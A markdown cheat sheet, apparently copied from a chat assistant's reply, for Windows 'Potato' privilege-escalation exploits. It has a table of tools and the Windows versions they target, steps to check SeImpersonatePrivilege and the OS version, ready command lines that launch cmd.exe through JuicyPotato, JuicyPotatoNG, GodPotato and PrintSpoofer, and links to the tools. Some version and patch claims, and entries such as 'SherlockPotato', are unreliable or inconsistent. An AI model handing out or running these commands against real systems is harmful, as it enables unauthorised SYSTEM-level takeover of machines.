# 🥔 Windows Potato Exploit List (New & Old)

This document contains a list of all **Potato-style privilege escalation exploits** for Windows, categorized by **old and new exploits** along with their applicable Windows versions.

## 📜 Exploit List

| **Exploit Name**       | **Status** | **Windows Versions** | **Notes** |
|------------------------|-----------|----------------------|-----------|
| **HotPotato**          | 🛑 Old    | Windows 7 - Windows 10 (1607) | Exploits NTLM relay via WPAD. **No longer effective on modern Windows.** |
| **RottenPotato**       | 🛑 Old    | Windows 7 - Windows 10 | Uses NTLM reflection attack. Replaced by JuicyPotato. |
| **JuicyPotato**        | 🛑 Old    | Windows 7 - Windows 10 (1809) | Uses DCOM & CLSID. **Patched in Windows 10 1903+.** |
| **JuicyPotatoNG**      | ✅ New    | Windows 10 1903+ - Windows 11 | Updated JuicyPotato for modern Windows. Requires valid CLSID. |
| **RoguePotato**        | 🛑 Old    | Windows 10 (up to 21H1), Windows Server 2019 | Uses fake RPC backconnect. **Patched in Windows 10 21H2+.** |
| **GodPotato**          | ✅ New    | Windows 10 & Windows 11 | Bypasses RPC filtering to get SYSTEM. Works on newer Windows versions. |
| **SweetPotato**        | ✅ New    | Windows 7 - Windows 10 (1809) | Alternative to JuicyPotato, does not require DCOM. |
| **PrintSpoofer**       | ✅ New    | Windows 10 & Windows 11 (If Print Spooler is running) | Exploits SeImpersonatePrivilege using Print Spooler. |
| **BadPotato**          | ✅ New    | Windows 10, Windows 11 | Similar to RoguePotato but works on newer versions. |
| **SherlockPotato**     | ✅ New    | Windows 10 & Windows 11 | Another variation using named pipes and RPC. |

---
Do not forget to check for PowerShell implementation of these attacks.
## 🛠️ How to Choose the Right Exploit

### 1️⃣ Check if `SeImpersonatePrivilege` is Enabled
```powershell
whoami /priv | findstr "SeImpersonatePrivilege"
```
✔️ **If enabled, move to Step 2**  
❌ **If not enabled, look for other privilege escalation methods.**  

### 2️⃣ Identify the Windows Version
```powershell
systeminfo | findstr /B /C:"OS Version"
```
Then, pick a compatible exploit from the table above.

---

## 📌 Example Usage Commands

### **JuicyPotato (Windows 7 - Windows 10 1809)**
```powershell
JuicyPotato.exe -t * -p cmd.exe -l 1337
```

### **JuicyPotatoNG (Windows 10 1903+ & Windows 11)**
```powershell
JuicyPotatoNG.exe -t * -p cmd.exe -l 9999
```

### **GodPotato (Windows 10 & 11)**
```powershell
GodPotato.exe -cmd "cmd.exe" -i
```

### **PrintSpoofer (If Print Spooler is Running)**
```powershell
PrintSpoofer.exe -c cmd.exe -i
```

---

## 📌 Key Takeaways
✔️ **If using Windows 10 (1809 or older),** use **JuicyPotato or SweetPotato**.  
✔️ **If using Windows 10 (1903+),** use **JuicyPotatoNG**.  
✔️ **If using Windows 10 (21H2+) or Windows 11,** use **GodPotato or PrintSpoofer**.  
✔️ **If Print Spooler is running,** **PrintSpoofer** is an easy win.  
✔️ **Always check if SeImpersonatePrivilege is enabled before trying a Potato exploit.**  

---

## 📥 Download Links
Most of these tools can be found on **GitHub** or within **Windows exploit toolkits**. Below are some links to useful resources:
- [JuicyPotatoNG](https://github.com/antonioCoco/JuicyPotatoNG)
- [GodPotato](https://github.com/BeichenDream/GodPotato)
- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

---

### 📌 **Offline Cheat Sheet Available?**
Would you like to see this as a **printable cheat sheet** for easy reference? Let me know!
